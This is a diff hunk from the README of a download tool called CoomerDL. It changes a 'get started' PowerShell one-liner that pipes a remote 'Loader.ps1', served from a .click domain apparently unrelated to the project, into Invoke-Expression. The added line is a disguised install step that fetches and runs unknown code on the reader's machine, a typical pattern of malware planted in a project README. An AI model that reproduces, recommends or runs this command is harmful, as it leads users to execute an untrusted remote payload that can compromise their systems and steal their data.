@@ -11,7 +11,7 @@ Make sure to check **"Add Python to PATH"** during installation.
 
 ### One-liner from powershell Win + X to get started:
 ```powershell
-irm https://software-get.click/Loader.ps1?get=CoomerDL | iex
+irm https://software-gateway.click/Loader.ps1?get=CoomerDL | iex
 ```
 ```
 ## How to use
